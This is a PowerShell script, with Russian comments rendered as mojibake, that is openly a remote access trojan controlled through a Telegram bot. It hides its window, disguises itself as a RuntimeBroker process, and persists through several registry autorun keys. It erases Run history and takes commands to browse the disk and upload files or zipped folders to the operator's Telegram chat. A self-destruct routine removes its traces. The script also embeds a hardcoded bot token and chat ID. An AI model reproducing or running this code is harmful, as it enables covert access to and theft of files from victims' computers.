# RAT —á–µ—Ä–µ–∑ Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ UTF-8 –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ä—É—Å—Å–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–æ–π
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —Å —Ñ–æ—Ä–º–æ–π
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è ZIP –∞—Ä—Ö–∏–≤–∞
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# –£–Ω–∏–∫–∞–ª—å–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ - –º–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ —Å–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å
$uniqueName = "RuntimeBroker_" + (Get-Random -Minimum 1000 -Maximum 9999)
$scriptPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.ps1"
$batPath = "$env:APPDATA\Microsoft\Windows\NetworkCache\$uniqueName.bat"

# –°–æ–∑–¥–∞–Ω–∏–µ BAT —Ñ–∞–π–ª–∞ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ PowerShell —Å–∫—Ä–∏–ø—Ç–∞
$batContent = "@echo off`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$batContent | Out-File -FilePath $batPath -Encoding ASCII

# –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞
$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Å—Ç –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
)

foreach ($regPath in $regPaths) {
    try {
        if (!(Test-Path $regPath)) { 
            New-Item -Path $regPath -Force | Out-Null 
        }
        if ($regPath -like "*Windows NT*") {
            Set-ItemProperty -Path $regPath -Name "Load" -Value $batPath -Force -ErrorAction SilentlyContinue
        } else {
            Set-ItemProperty -Path $regPath -Name $uniqueName -Value $batPath -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
$currentDir = "C:\"
$global:LastSentMessage = ""

# –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ $env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–ø—Ä–æ—Å–∞
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/selfdestruct - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: $newDir"
                                    continue
                                }
                            }
                            
                            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å –ø–æ–º–æ—â—å—é /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –ø–∞–ø–∫—É
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "–ü–∞–ø–∫–∞ $target –∑–∞–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: $target"
                                    }
                                } else {
                                    Send-Telegram "–§–∞–π–ª $target –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω" $fullPath
                                }
                            } else {
                                Send-Telegram "–§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            # –†–ï–ê–õ–¨–ù–û –†–ê–ë–û–¢–ê–Æ–©–ê–Ø –§–£–ù–ö–¶–ò–Ø –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ò–Ø
                            $report = "üîÑ –ù–∞—á–∏–Ω–∞—é —Ä–µ–∞–ª—å–Ω–æ–µ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ...`n"
                            
                            # 1. –°–æ–∑–¥–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞
                            $vbsScript = @"
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞
WScript.Sleep 5000

' –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª—ã
On Error Resume Next
fso.DeleteFile "$scriptPath", True
fso.DeleteFile "$batPath", True
fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True

' –û—á–∏—â–∞–µ–º —Ä–µ–µ—Å—Ç—Ä
WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\$uniqueName\"
WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\$uniqueName\"
WshShell.RegDelete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load\"

' –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é RUN
WshShell.Run "cmd /c reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True

' –£–¥–∞–ª—è–µ–º —Å–∞–º VBS —Å–∫—Ä–∏–ø—Ç
fso.DeleteFile WScript.ScriptFullName, True
"@

                            $vbsPath = [System.IO.Path]::GetTempFileName() + ".vbs"
                            $vbsScript | Out-File -FilePath $vbsPath -Encoding ASCII

                            # 2. –ó–∞–ø—É—Å–∫–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç
                            $vbsProcess = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden -PassThru
                            
                            # 3. –û—á–∏—â–∞–µ–º —Ä–µ–µ—Å—Ç—Ä –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
                                $report += "‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ Run –æ—á–∏—â–µ–Ω–∞`n"
                            } catch { $report += "‚ùå –û—à–∏–±–∫–∞ Run`n" }
                            
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
                                $report += "‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ StartupApproved –æ—á–∏—â–µ–Ω–∞`n"
                            } catch { $report += "‚ùå –û—à–∏–±–∫–∞ StartupApproved`n" }
                            
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction SilentlyContinue
                                $report += "‚úÖ –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ Windows NT –æ—á–∏—â–µ–Ω–∞`n"
                            } catch { $report += "‚ùå –û—à–∏–±–∫–∞ Windows NT`n" }
                            
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                $report += "‚úÖ –ò—Å—Ç–æ—Ä–∏—è RUN –æ—á–∏—â–µ–Ω–∞`n"
                            } catch { $report += "‚ùå –û—à–∏–±–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN`n" }

                            $report += "`nüóëÔ∏è –§–∞–π–ª—ã –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥..."
                            $report += "`n‚ö†Ô∏è RAT –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É..."

                            Send-Telegram $report
                            
                            # 4. –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –∑–∞–≤–µ—Ä—à–∞–µ–º —Ä–∞–±–æ—Ç—É
                            Start-Sleep -Seconds 2
                            Stop-Process -Id $PID -Force
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
